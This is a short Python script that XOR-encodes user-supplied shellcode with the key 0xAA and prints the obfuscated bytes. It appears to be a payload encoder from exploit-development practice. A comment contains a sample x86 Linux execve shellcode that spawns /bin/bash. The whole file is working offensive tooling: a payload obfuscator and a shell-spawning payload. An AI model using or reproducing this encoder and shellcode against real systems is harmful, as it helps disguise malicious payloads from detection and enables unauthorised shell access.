#!/bin/python3
import binascii

def getarr(sc) :
	ec=""
	for i in range(len(sc)):
		if sc[i]=='x'or sc[i]=='\\':
			continue
		else:
			ec=ec+sc[i]
	return ec

def xorstring(a):
	s=binascii.unhexlify(a)
	ec=""
	for x in s:
		j=x^0xAA
		ec += '0x'
		ec += "%02x," %j
	return(ec)

sc=input("ENTER SHELLCODE : ")
#"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
print(xorstring(getarr(sc)))
#print(b)
